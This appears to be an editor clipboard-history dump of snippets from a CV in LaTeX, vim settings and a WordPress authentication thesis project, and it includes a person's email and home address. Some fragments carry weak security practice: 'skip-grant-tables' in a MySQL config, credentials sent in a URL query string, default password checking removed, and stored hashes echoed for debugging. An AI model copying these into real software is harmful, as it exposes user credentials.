5634c046b98db7eedbbf6177669d84a2|file:///home/neo/Documents/resume/cv.tex|94|8|v|tex
	June - July 2019
d72c40507d81c4bdc2b6f9ae82185520|file:///home/neo/Documents/resume/cv.tex|95|3|v|tex
	Research Assistant Internship
f027f27d0d548351e4d362e9b90678a9|file:///home/neo/Documents/resume/cv.tex|95|3|v|tex
	Research
5143877777c5ac11ec4549839523d80f|file:///home/neo/Documents/resume/cv.tex|95|3|v|tex
	 Assistant Internship
4758822d775ef59d3e4220bb46e2c7b5|file:///home/neo/Documents/resume/cv.tex|96|6|v|tex
	Texas A\&M University
a85dac886e3409b3d530b662bc5d73a4|file:///home/neo/Documents/resume/cv.tex|98|15|v|tex
	Worked under the supervision of professor Chia-Che Chai, along with professors Abdullah Muzahid and Eun Jung Kim
383bbf3f3f6a7dbb69be05af4f30eabe|file:///home/neo/Documents/resume/cv.tex|100|9|V|tex
	        \item Part of the research team writing ReViCe: Reusing Victim Cache to Prevent Speculative Cache Leakage, currently under submission for ISCA
14c4f34d20d0123130525c59c1036f89|file:///home/neo/Documents/resume/cv.tex|104|8|v|tex
	Sep 2011 - Jun 2014
e73f9315d179dcb2c9533e183c1ee02b|file:///home/neo/Documents/resume/cv.tex|105|3|v|tex
	Kykkos B Lyceum ‚Äì High School Diploma
8182b585d22d41e3a1981328d2ecfe66|file:///home/neo/Documents/resume/cv.tex|106|3|v|tex
	Graduation Grade: 19.73/20
d95867deadfe690e40f42068d6b59df8|file:///home/neo/Documents/resume/cv.tex|109|10|v|tex
	References
b54460d0f61015ea6a3662e57e868ee1|file:///home/neo/Documents/resume/cv.tex|111|16|V|tex
	\begin{itemize}
		\item Email me
	
	\end{itemize}
ae97e68265b6ae43e4664b099d40a3e8|file:///home/neo/Documents/resume/cv.tex|113|2|V|tex
		\email{} :     & \href{mailto:luke@lukesmith.xyz}{luke@lukesmith.xyz}\\
a7089903ef4b291770ada9a38d727e95|file:///home/neo/Documents/resume/cv.tex|113|5|v|tex
	{\textsc Greek: Native speaker}
a7089903ef4b291770ada9a38d727e95|file:///home/neo/Documents/resume/cv.tex|113|5|v|tex
	{\textsc Greek: Native speaker}
1388a2d7639310ebd30e67f1d8a44245|file:///home/neo/Documents/resume/cv.tex|108|1|V|tex
	\section{Languages}
	\begin{minipage}[t]{.5\linewidth}
	\begin{tabular}{rp{.75\linewidth}}
		\baselineskip=20pt
	    {\textsc Greek: Native speaker}
	    {English: Highly proficient}
	\end{tabular}
	\end{minipage}
	\end{document}
dd6b97028448bc763f61f4653c16c3cf|file:///home/neo/Documents/resume/cv.tex|84|1|V|tex
	\section{Work Experience}
	
	\entry{June - July 2019}
		{Research Assistant Internship}
	    {Texas A\&M University}
	    {\begin{itemize}
	        \item Worked under the supervision of professor Chia-Che Chai, along with professors Abdullah Muzahid and Eun Jung Kim
	        \item Part of the research team writing ReViCe: Reusing Victim Cache to Prevent Speculative Cache Leakage, currently under submission for ISCA
	\end{itemize}}
	
6020f0b3c55251e478fb1a839cbe0fff|file:///home/neo/Documents/resume/cv.tex|119|10|v|tex
	Work Experience
688937ccaf2a2b0c45a1c9bbba09698d|file:///home/neo/Documents/resume/cv.tex|121|8|v|tex
	June
13d4fcc45d08e7ddb0860994ff8e23e7|file:///home/neo/Documents/resume/cv.tex|121|8|v|tex
	 - July 2019
30aa01e388bf68459326747c5c5db97e|file:///home/neo/Documents/resume/cv.tex|123|1|V|tex
	    {Texas A\&M University}
	    {\begin{itemize}
	        \item Worked under the supervision of professor Chia-Che Chai, along with professors Abdullah Muzahid and Eun Jung Kim
	        \item Part of the research team writing ReViCe: Reusing Victim Cache to Prevent Speculative Cache Leakage, currently under submission for ISCA
	\end{itemize}}
	
56d9d6962fcb0679e7c520bec1a86051|file:///home/neo/Documents/resume/cv.tex|119|1|V|tex
	\entry{Award "Tech 2 Tech"\\Academic year 2018-19}
136d8fad55bb6785a416bcd759443c5f|file:///home/neo/Documents/resume/cv.tex|119|1|V|tex
	\entry{Award "Tech 2 Tech"\\Academic year 2018-19}
		{Awarded to the student with the higher overall performance in the courses Software Engineering and Artificial Intelligence}
b679fe0c47a0f879e5835616d552f768|file:///home/neo/Documents/resume/cv.tex|119|27|v|tex
	Academic year 2018-19
364fdf91164899198de4b43137f90594|file:///home/neo/Documents/resume/cv.tex|119|1|V|tex
	\entry{Award "Tech 2 Tech"}
		{Awarded to the student with the higher overall performance in the courses Software Engineering and Artificial Intelligence}
	    {University of Cyprus - Academic year 2018-19}
4557b1b1c73eaa76e61f12f4f02a26c8|file:///home/neo/Documents/resume/cv.tex|123|8|v|tex
	Award
730982cf3d19a0586afacca614264ee8|file:///home/neo/Documents/resume/cv.tex|123|8|v|tex
	 "Tech 2 Tech"
623c7af7f1f43c8725628e313d064ba0|file:///home/neo/Documents/resume/cv.tex|124|3|v|tex
	Awarded to the student with the higher overall performance in the courses Software Engineering and Artificial Intelligence
735de97ddd8380119e9f81b5f23766da|file:///home/neo/Documents/resume/cv.tex|127|15|v|tex
	Tech 2 Tech
bbbf2eeeb9c2d06ae2a6683e398b6ab5|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|46|69|v|tex
	 (myjs
4dc4ec7091509ce4cb8d0265922bbe2e|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|2|237|v|tex
	and 
c37db44b2a06d3a457c42c43ca02a4a3|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|2|237|v|tex
	Web 
7c794ec643d9edc5515d048612c3b863|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|2|237|v|tex
	Crypto 
d1ab81a1b5b7015bf5ac1d9d9fbf9fd5|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|2|237|v|tex
	API 
77ab2f49f3c08fdbdb5261cdf11a4f41|file:///home/neo/Documents/resume/cv.tex|90|1|V|tex
	        \itemsep0em 
7281d46d5e9fdbaac706c6affeb30f64|file:///home/neo/Documents/resume/cv.tex|99|13|V|tex
	            \itemsep0em 
fd5ad9f1548314e5270295ab09b873d0|file:///home/neo/Documents/resume/cv.tex|38|1|V|tex
	\begin{minipage}[t]{.25\linewidth}
	\hfill \textsc{#1}
	\end{minipage}
	\hfill\vline\hfill
	\begin{minipage}[t]{.70\linewidth}
	{\bf#2}\\\textit{#3} {#4}
	\end{minipage}\\
	\vspace{.2cm}
	}}
039c8ef03848df97f4728f5f5f703d81|file:///home/neo/Documents/resume/cv.tex|116|8|v|tex
	\textsc{#1}
5c502874984e0cda51216bc1f2c7039a|file:///home/neo/Documents/resume/cv.tex|120|1|v|tex
	{\bf#2}\\\textit{#3} {#4}
80a0c0daa55806984663bf0910855d80|file:///home/neo/Documents/resume/cv.tex|115|1|V|tex
	\begin{minipage}[t]{.50\linewidth}
	\hfill 
	\end{minipage}
	\hfill\vline\hfill
	\begin{minipage}[t]{.50\linewidth}
	\end{minipage}\\
	\vspace{.2cm}
4de4f8ad4f7295db7eabe55e4491e73c|file:///home/neo/Documents/resume/cv.tex|128|1|V|tex
	    {\textsc{Greek:} Native speaker}
68fd8c3cc13d40a76509e3bf2fcdac22|file:///home/neo/Documents/resume/cv.tex|129|5|V|tex
	    {\textsc{English:} Highly proficient}
5b9a42f8f8feb825c408c7ce893a62e0|file:///home/neo/Documents/resume/cv.tex|125|7|v|tex
	\vline\hfill
0f3b4aea45c01bc4978e17437ab3fce8|file:///home/neo/Documents/resume/cv.tex|129|1|V|tex
	\vspace{.2cm}
2ae7071f4e5e1f04e6bb91a03a81e681|file:///home/neo/Documents/resume/cv.tex|133|1|V|tex
	\end{tabular}
be7901bf0c879d8aa33f16d4927a9dae|file:///home/neo/Documents/resume/cv.tex|121|1|v|tex
	\begin{tabular}{rp{.75\linewidth}}
f520c14f40d15664ea591624a7be3e59|file:///home/neo/Documents/resume/cv.tex|89|18|v|tex
	Work 
f520c14f40d15664ea591624a7be3e59|file:///home/neo/Documents/resume/cv.tex|89|18|v|tex
	Work 
728abc80dea03669a16c4c371fa70913|file:///home/neo/Documents/resume/cv.tex|89|18|^v|tex
	Work Experience}
5d52b4eaca1414cab332a4736f10788f|file:///home/neo/Documents/resume/cv.tex|89|17|v|tex
	 Work Experience
5d52b4eaca1414cab332a4736f10788f|file:///home/neo/Documents/resume/cv.tex|89|17|v|tex
	 Work Experience
3a08e2e340ab29fd9263af48193cbf8e|file:///home/neo/Documents/resume/cv.tex|119|10|v|tex
	Languages
3a08e2e340ab29fd9263af48193cbf8e|file:///home/neo/Documents/resume/cv.tex|119|10|v|tex
	Languages
f66cdb8a3ef49c79c633e1bffcfd1e74|file:///home/neo/Documents/resume/cv.tex|136|10|v|tex
	Awards
f66cdb8a3ef49c79c633e1bffcfd1e74|file:///home/neo/Documents/resume/cv.tex|136|10|v|tex
	Awards
d4185ef97a67fdfa2bf651177eb5e6c8|file:///home/neo/Documents/resume/cv.tex|19|1|V|tex
	% Your name goes here:
65b4eb3f5ea0cd97730c28d683b94934|file:///home/neo/Documents/resume/cv.tex|22|52|v|tex
	cv/email.png
385c7be2303fc7b52db6372ba3cb8682|file:///home/neo/Documents/resume/cv.tex|84|32|v|tex
	luke@lukesmith.xyz
c0e519cb7764b26c63c8e3852e26e280|file:///home/neo/Documents/resume/cv.tex|81|1|V|tex
	\begin{minipage}[t]{.5\linewidth}
	\begin{tabular}{rp{.75\linewidth}}
		\baselineskip=20pt
		\email{} :     & \href{mailto:neophytos.christou19@gmail.com}{neophytos.christou19@gmail.com}\\
	\end{tabular}
	\end{minipage}
	
776326eda220d3a09c5bc08d16e761d8|file:///home/neo/Documents/resume/cv.tex|81|1|V|tex
	\begin{minipage}[t]{.5\linewidth}
	\begin{tabular}{rp{.75\linewidth}}
		\baselineskip=20pt
		\email{} :     & \href{mailto:neophytos.christou19@gmail.com}{neophytos.christou19@gmail.com}\\
	\end{tabular}
	\end{minipage}
410dd222924d0d2b2d1f1646aea0f1ae|file:///home/neo/Documents/resume/cv.tex|34|5|V|tex
	    \end{minipage}
6e768b86dc06209345a94d297589d3fb|file:///home/neo/Documents/resume/cv.tex|28|6|v|tex
	\centering
eda7a1baa44df668764b7c8a6e9aba1b|file:///home/neo/Documents/resume/cv.tex|27|21|v|tex
	{.5\textwidth}
1ee3e4d5dd3988a767e5a5593d3ef75c|file:///home/neo/Documents/resume/cv.tex|27|22|v|tex
	.5\textwidth
23d15fae33c71cea8033832584146399|file:///home/neo/Documents/resume/cv.tex|30|1|V|tex
	    \begin{minipage}[t]{.5\linewidth}
	    \begin{tabular}{rp{.75\linewidth}}
	        \baselineskip=20pt
	        \email{} :     & \href{mailto:neophytos.christou19@gmail.com}{neophytos.christou19@gmail.com}\\
	    \end{tabular}
		\end{minipage}
3d63cb713ef11da3acfcd2a40cca7540|file:///home/neo/Documents/resume/cv.tex|81|5|V|tex
	    \begin{minipage}[t]{.5\linewidth}
b5a5ffd5354b63a51e795ccd6a62175d|file:///home/neo/Documents/resume/cv.tex|85|2|V|tex
		\end{minipage}
4c89d4ef55467bbf8b02de14017b7964|file:///home/neo/Documents/resume/cv.tex|84|1|V|tex
	    \end{tabular}
1cb068215c4673a7a154ad33ac0f40e9|file:///home/neo/Documents/resume/cv.tex|81|1|V|tex
	    \begin{tabular}{rp{.75\linewidth}}
1746dfd96df0c70282c805d47530f1b8|file:///home/neo/Documents/resume/cv.tex|81|9|V|tex
	        \baselineskip=20pt
727fdf8c2a8cef3206efd9ff357a0cef|file:///home/neo/Documents/resume/cv.tex|27|2|V|tex
		\begin{minipage}[t]{.5\textwidth}
b235ab3fbcb41bef9bf6f611ce5647f9|file:///home/neo/Documents/resume/cv.tex|26|1|V|tex
	    \hspace{.25\textwidth}
		\begin{minipage}[t]{.5\textwidth}
	\par{\centering{\Huge \bfseries{\theauthor}}\par}
	    \end{minipage}
ee0e6a22d9b1a31ce6c1ca8c7ab09878|file:///home/neo/Documents/resume/cv.tex|81|5|V|tex
	    \hspace{.25\textwidth}
7ad0e716fd8199cf21fa04e27e5f4e36|file:///home/neo/Documents/resume/cv.tex|33|1|V|tex
	        \textbf{Address: } 21 Pheidiou, Strovolos, Nicosia, Cyprus
2bf1d5fae1c321d594fdedf05058f709|file:///home/neo/Documents/resume/cv.tex|34|17|v|tex
	Address:
1172d4772e5c49350c751bcb7fed7858|file:///home/neo/Documents/resume/cv.tex|34|26|v|tex
	21 Pheidiou, Strovolos, Nicosia, Cyprus
3c6a168da971974074718d6ef1f38f8e|file:///home/neo/Documents/resume/cv.tex|36|32|v|tex
	Cyprtion
b01ce41b8b561276787e7c9eed0ac179|file:///home/neo/Documents/resume/cv.tex|32|9|v|tex
	\email{} 
eb91bd3fe64bd25d7866c5ae9684bc3f|file:///home/neo/Documents/resume/cv.tex|18|1|V|tex
	\titlespacing*{\section}
	{0pt}{5.5ex plus 1ex minus .2ex}{4.3ex plus .2ex}
f020db1e7d7b9fd5737e04a672a46813|file:///home/neo/Documents/resume/cv.tex|19|7|v|tex
	5. plus 1ex minus .2ex
ebcec135924ce4ef453ec233d5ec339f|file:///home/neo/Documents/resume/cv.tex|19|12|v|tex
	43ex plus .2ex
e0b91c6a3bca8d3ed69915dfb5414c58|file:///home/neo/Documents/resume/cv.tex|18|11|V|tex
	\titlespacing*{\section}
	{0pt}{0pt}{}
7d96c759d56607b68d697fe71e52ca4f|file:///home/neo/Documents/resume/cv.tex|134|2|V|tex
		\baselineskip=20pt
712294cd3ce34d1c6b5cf4a78cdbf84b|file:///home/neo/Documents/resume/cv.tex|132|1|V|tex
	\begin{minipage}[t]{.5\linewidth}
ed40c574da9dc9d7677b4ea7988eab9f|file:///home/neo/Documents/resume/cv.tex|143|1|V|tex
	\end{minipage}
2278e91027f82b47fe2096eb16bdcfce|file:///home/neo/Documents/resume/cv.tex|19|20|v|tex
	oitemsep,
6200868d821c53e503346fb4a0cb0546|file:///home/neo/Documents/resume/cv.tex|111|49|^v|tex
	ReViCe: Reusing Victim Cache to Prevent Speculative Cache Leakage,
b7b1e314614cf326c6e2b6eba1540682|file:///home/neo/Documents/resume/cv.tex|17|2|v|tex
	TODO
27fbfacf0dc2f0bd14f38d210c887c50|file:///home/neo/Documents/resume/cv.tex|17|1|v|tex
	'TODO'
27fbfacf0dc2f0bd14f38d210c887c50|file:///home/neo/Documents/resume/cv.tex|17|1|v|tex
	'TODO'
7fbfb92a885476b566ed751eff253e87|file:///home/neo/.vim/bundle/vimtex/doc/vimtex.txt|2859|1|V|help
	  call vimtex#imaps#add_map({
	    \ 'lhs' : 'test',
	    \ 'rhs' : '\tested',
	    \ 'wrapper' : 'vimtex#imaps#wrap_trivial'
	    \})
d941191e51e81390343e12b159bb123f|file:///home/neo/.vimrc|252|17|v|vim
	tested
bfcb491b8a91f19bb5b1f2ab77b20fc3|file:///home/neo/.vimrc|249|1|V|vim
	let g:vimtex_imaps_leader = ';'
cb071d80d1a54f21c8867a038f6a6c66|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|15|38|v|tex
	figure
1870a829d9bc69abf500eca6f00241fe|file:///etc/wordpress/config-localhost.php|3|20|v|php
	wordpress
86446c631b39c1057b9f9a9382addffd|file:///etc/wordpress/config-localhost.php|4|24|v|php
	<your-password>
793b2e64bb1c77b1443bc207ca96e833|file:///etc/mysql/my.cnf|22|1|V|conf
	skip-grant-tables
65cbc2b8fed955d1163271cd992d823f|file:///etc/wordpress/config-localhost.php|3|26|v|php
	@'localhost'
f3602f29df6cdb366601e79ab4e4d1dc|file:///etc/wordpress/config-localhost.php|3|25|v|php
	@localhost
fc35fdc70d5fc69d269883a822c7a53e|file:///etc/apache2/sites-enabled/000-default.conf|12|24|v|apache
	html
e37610d84c63d90bb61a8f78587cb4b4|file:///etc/apache2/sites-enabled/000-default.conf|12|23|v|apache
	/wordpress
5ea91b02dcc44e208fa9a45200d75f28|file:///etc/apache2/sites-enabled/000-default.conf|33|17|v|apache
	yourdomainname
42922c2bf2c4adf350b09d491b9d63a4|file:///etc/apache2/sites-enabled/000-default.conf|33|1|V|apache
	ServerAlias www.auth.com
bed763da5d83dbe09200aa709c4803c7|file:///home/neo/mysql-init|1|46|v|
	MyNewPass
988f2249fa145744d0e5f1a7cf330351|untitled:1|1|1|V|
	function demo_auth( $user, $username, $password ){
	    // Make sure a username and password are present for us to work with
	    if($username == '' || $password == '') return;
	
	    $response = wp_remote_get( "http://localhost/auth_serv.php?user=$username&pass=$password" );
	    $ext_auth = json_decode( $response['body'], true );
	
	     if( $ext_auth['result']  == 0 ) {
	        // User does not exist,  send back an error message
	        $user = new WP_Error( 'denied', __("ERROR: User/pass bad") );
	
	     } else if( $ext_auth['result'] == 1 ) {
	         // External user exists, try to load the user info from the WordPress user table
	         $userobj = new WP_User();
	         $user = $userobj->get_data_by( 'email', $ext_auth['email'] ); // Does not return a WP_User object :(
	         $user = new WP_User($user->ID); // Attempt to load up the user with that ID
	
	         if( $user->ID == 0 ) {
	             // The user does not currently exist in the WordPress user table.
	             // You have arrived at a fork in the road, choose your destiny wisely
	
	             // If you do not want to add new users to WordPress if they do not
	             // already exist uncomment the following line and remove the user creation code
	             //$user = new WP_Error( 'denied', __("ERROR: Not a valid user for this system") );
	
	             // Setup the minimum required user information for this example
	             $userdata = array( 'user_email' => $ext_auth['email'],
	                                'user_login' => $ext_auth['email'],
	                                'first_name' => $ext_auth['first_name'],
	                                'last_name' => $ext_auth['last_name']
	                                );
	             $new_user_id = wp_insert_user( $userdata ); // A new user has been created
	
	             // Load the new user info
	             $user = new WP_User ($new_user_id);
	         } 
	
	     }
	
	     // Comment this line if you wish to fall back on WordPress authentication
	     // Useful for times when the external service is offline
	     remove_action('authenticate', 'wp_authenticate_username_password', 20);
	
	     return $user;
	}
732bb3853e522c1b380ee8a0b9aa1dae|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/functions.php|55|10|V|php
	function demo_auth( $user, $username, $password ){
	    return $user;
	}
e6b2c9c023755a238dafc2765d5fa87e|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/default-filters.php|431|29|v|php
	[ $this->authenticate, 'authenticate' 
de54446e1d2fda32099d8fc441a9ba7c|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/user.php|124|1|V|php
	function wp_authenticate_username_password( $user, $username, $password ) {
		if ( $user instanceof WP_User ) {
			return $user;
		}
	
		if ( empty( $username ) || empty( $password ) ) {
			if ( is_wp_error( $user ) ) {
				return $user;
			}
	
			$error = new WP_Error();
	
			if ( empty( $username ) ) {
				$error->add( 'empty_username', __( '<strong>ERROR</strong>: The username field is empty.' ) );
			}
	
			if ( empty( $password ) ) {
				$error->add( 'empty_password', __( '<strong>ERROR</strong>: The password field is empty.' ) );
			}
	
			return $error;
		}
	
		$user = get_user_by( 'login', $username );
	
		if ( ! $user ) {
			return new WP_Error(
				'invalid_username',
				__( 'Unknown username. Check again or try your email address.' )
			);
		}
058ea2b4d2558c264f5c96a765ca8b9e|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/user.php|114|1|V|php
	/**
	 * Authenticate a user, confirming the username and password are valid.
	 *
	 * @since 2.8.0
	 *
	 * @param WP_User|WP_Error|null $user     WP_User or WP_Error object from a previous callback. Default null.
	 * @param string                $username Username for authentication.
	 * @param string                $password Password for authentication.
	 * @return WP_User|WP_Error WP_User on success, WP_Error on failure.
	 */
	function wp_authenticate_username_password( $user, $username, $password ) {
		if ( $user instanceof WP_User ) {
			return $user;
		}
	
		if ( empty( $username ) || empty( $password ) ) {
			if ( is_wp_error( $user ) ) {
				return $user;
			}
	
			$error = new WP_Error();
	
			if ( empty( $username ) ) {
				$error->add( 'empty_username', __( '<strong>ERROR</strong>: The username field is empty.' ) );
			}
	
			if ( empty( $password ) ) {
				$error->add( 'empty_password', __( '<strong>ERROR</strong>: The password field is empty.' ) );
			}
	
			return $error;
		}
	
		$user = get_user_by( 'login', $username );
	
		if ( ! $user ) {
			return new WP_Error(
				'invalid_username',
				__( 'Unknown username. Check again or try your email address.' )
			);
		}
	
		/**
		 * Filters whether the given user can be authenticated with the provided $password.
		 *
		 * @since 2.5.0
		 *
		 * @param WP_User|WP_Error $user     WP_User or WP_Error object if a previous
		 *                                   callback failed authentication.
		 * @param string           $password Password to check against the user.
		 */
		$user = apply_filters( 'wp_authenticate_user', $user, $password );
		if ( is_wp_error( $user ) ) {
			return $user;
		}
	
		if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
			return new WP_Error(
				'incorrect_password',
				sprintf(
					/* translators: %s: User name. */
					__( '<strong>ERROR</strong>: The password you entered for the username %s is incorrect.' ),
					'<strong>' . $username . '</strong>'
				) .
				' <a href="' . wp_lostpassword_url() . '">' .
				__( 'Lost your password?' ) .
				'</a>'
			);
		}
	
		return $user;
	}
94fc3e08526d3337968fcf7189c11d7d|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/user.php|44|10|v|php
	wp_authenticate_username_password
26783c5a98479c7e20696417cbf8dd10|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/user.php|72|9|v|php
	Unknown username. Check again or try your email address.
c8f73617f07bb2dce602c00f3daf7b05|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/user.php|95|34|v|php
	The password you entered for the username %s is incorrect.
23af7b54bdc7d1dd081e8e58c48fcf12|file:///home/neo/Documents/diplomatiki/auth-webapp/index.php|26|21|v|php
	dff84d758a3f413c30247e4a751b9241afb680c0df83eef162360e284d9e8be6
b60771f65f9f93581cbc132e677d63ef|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2313|1|V|php
	if ( ! function_exists( 'wp_check_password' ) ) :
		/**
		 * Checks the plaintext password against the encrypted Password.
		 *
		 * Maintains compatibility between old version and the new cookie authentication
		 * protocol using PHPass library. The $hash parameter is the encrypted password
		 * and the function compares the plain text password when encrypted similarly
		 * against the already encrypted password to see if they match.
		 *
		 * For integration with other applications, this function can be overwritten to
		 * instead use the other package password checking algorithm.
		 *
		 * @since 2.5.0
		 *
		 * @global PasswordHash $wp_hasher PHPass object used for checking the password
		 *  against the $hash + $password
		 * @uses PasswordHash::CheckPassword
		 *
		 * @param string     $password Plaintext user's password
		 * @param string     $hash     Hash of the user's password to check against.
		 * @param string|int $user_id  Optional. User ID.
		 * @return bool False, if the $password does not match the hashed password
		 */
		function wp_check_password( $password, $hash, $user_id = '' ) {
			global $wp_hasher;
	
			// If the hash is still md5...
			if ( strlen( $hash ) <= 32 ) {
				$check = hash_equals( $hash, md5( $password ) );
				if ( $check && $user_id ) {
					// Rehash using new hash.
					wp_set_password( $password, $user_id );
					$hash = wp_hash_password( $password );
				}
	
				/**
				 * Filters whether the plaintext password matches the encrypted password.
				 *
				 * @since 2.5.0
				 *
				 * @param bool       $check    Whether the passwords match.
				 * @param string     $password The plaintext password.
				 * @param string     $hash     The hashed password.
				 * @param string|int $user_id  User ID. Can be empty.
				 */
				return apply_filters( 'check_password', $check, $password, $hash, $user_id );
			}
	
			// If the stored hash is longer than an MD5, presume the
			// new style phpass portable hash.
			if ( empty( $wp_hasher ) ) {
				require_once( ABSPATH . WPINC . '/class-phpass.php' );
				// By default, use the portable hash from phpass
				$wp_hasher = new PasswordHash( 8, true );
			}
	
			$check = $wp_hasher->CheckPassword( $password, $hash );
	
			/** This filter is documented in wp-includes/pluggable.php */
			return apply_filters( 'check_password', $check, $password, $hash, $user_id );
		}
	endif;
	
a40312164f3077f1fa9d5e6d5ded8d84|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2313|26|v|php
	wp_check_password
b2dd0f7bb7dd1c0d22dce2582f20e95a|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2315|1|V|php
		 * Checks the plaintext password against the encrypted Password.
		 *
		 * Maintains compatibility between old version and the new cookie authentication
		 * protocol using PHPass library. The $hash parameter is the encrypted password
		 * and the function compares the plain text password when encrypted similarly
		 * against the already encrypted password to see if they match.
		 *
		 * For integration with other applications, this function can be overwritten to
		 * instead use the other package password checking algorithm.
		 *
		 * @since 2.5.0
a396207e8838aa7a4a8a633aa6d6b5ac|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/user.php|95|41|v|php
	kodikos
d0135242f5f03f10598d4566f88528c4|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/user.php|98|1|V|php
				' <a href="' . wp_lostpassword_url() . '">' .
				__( 'Lost your password?' ) .
				'</a>'
dbca567f600bb6e80afa7940b866e9c0|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2350|1|V|php
			// If the stored hash is longer than an MD5, presume the
			// new style phpass portable hash.
			if ( empty( $wp_hasher ) ) {
				require_once( ABSPATH . WPINC . '/class-phpass.php' );
				// By default, use the portable hash from phpass
				$wp_hasher = new PasswordHash( 8, true );
			}
	
			$check = $wp_hasher->CheckPassword( $public_key, $hash );
	
			/** This filter is documented in wp-includes/pluggable.php */
			return apply_filters( 'check_password', $check, $public_key, $hash, $user_id );
6891797c65dd16cc2521b793f1097282|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2329|3|V|php
			if ( strlen( $hash ) <= 32 ) {
595d8e09422095c66e6219d3f5632f10|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2328|2|V|php
			// If the hash is still md5...
93640c0f9dbac45b0a884aeee74c3ca2|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2335|1|V|php
	        /**
	         * Filters whether the plaintext password matches the encrypted password.
	         *
	         * @since 2.5.0
	         *
	         * @param bool       $check    Whether the passwords match.
	         * @param string     $password The plaintext password.
	         * @param string     $hash     The hashed password.
	         * @param string|int $user_id  User ID. Can be empty.
	         */
482642efafbfecb7451966d84f03fb22|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2389|1|V|php
			if ( empty( $wp_hasher ) ) {
				require_once( ABSPATH . WPINC . '/class-phpass.php' );
				// By default, use the portable hash from phpass
				$wp_hasher = new PasswordHash( 8, true );
			}
	
			$check = $wp_hasher->CheckPassword( $password, $hash );
	
0800fc577294c34e0b28ad2839435945|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2561|31|v|php
	hash
67803e14283130c038a286b04069bf88|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2326|1|V|php
			global $wp_hasherjjVj
	
			if ( empty( $wp_hasher ) ) {
				require_once( ABSPATH . WPINC . '/class-phpass.php' );
				// By default, use the portable hash from phpass
				$wp_hasher = new PasswordHash( 8, true );
			}
102c360da5335b4a06b67d48dc726119|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2327|12|v|php
	$wp_hasher->CheckPassword( $password, $hash );
37542cb8749e79e7d9bb65f692649591|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2328|9|V|php
	        echo $stored;
08980b27fae19bb72b3702b06371808f|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2364|1|V|php
			global $wp_hasher;
	
			// If the hash is still md5...
			if ( strlen( $hash ) <= 32 ) {
				$check = hash_equals( $hash, md5( $password ) );
				if ( $check && $user_id ) {
					// Rehash using new hash.
					wp_set_password( $password, $user_id );
					$hash = wp_hash_password( $password );
				}
	
				/**
				 * Filters whether the plaintext password matches the encrypted password.
				 *
				 * @since 2.5.0
				 *
				 * @param bool       $check    Whether the passwords match.
				 * @param string     $password The plaintext password.
				 * @param string     $hash     The hashed password.
				 * @param string|int $user_id  User ID. Can be empty.
				 */
				return apply_filters( 'check_password', $check, $password, $hash, $user_id );
			}
	
			// If the stored hash is longer than an MD5, presume the
			// new style phpass portable hash.
			if ( empty( $wp_hasher ) ) {
				require_once( ABSPATH . WPINC . '/class-phpass.php' );
				// By default, use the portable hash from phpass
				$wp_hasher = new PasswordHash( 8, true );
			}
	
			$check = $wp_hasher->CheckPassword( $password, $hash );
	
			/** This filter is documented in wp-includes/pluggable.php */
			return apply_filters( 'check_password', $check, $password, $hash, $user_id );
ec240ca98d5350a5074f6f10c8531310|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2363|3|V|php
			$check = hash_equals($public_key, $stored);
	
	        /* $check = hash_equals( $hash, md5( $public_key ) ); */
	        /* if ( $check && $user_id ) { */
	        /*     // Rehash using new hash. */
	        /*     wp_set_password( $public_key, $user_id ); */
	        /*     $hash = wp_hash_password( $public_key ); */
	        /* } */
	
	        return apply_filters( 'check_password', $check, $public_key, $stored, $user_id );
6299ba2cbd9661a5e3872b715521cd6a|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2331|48|v|php
	only
41302386dd922ebd9c7f0f92c49f763d|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2337|13|V|php
	            echo "test";
9317c89cd201c8aa4df801fc1b609ea1|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2301|1|V|php
			/* global $wp_hasher; */
	
41f0e62259b1dd485ae3c73283f0accc|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2328|1|V|php
			global $wp_hasher;
	        echo $stored;
	
			// If the hash is still md5...
			if ( strlen( $stored ) <= 32 ) {
				$check = hash_equals( $stored, md5( $public_key ) );
				if ( $check && $user_id ) {
					// Rehash using new hash.
					wp_set_password( $public_key, $user_id );
					$stored = wp_hash_password( $public_key );
				}
	
				/**
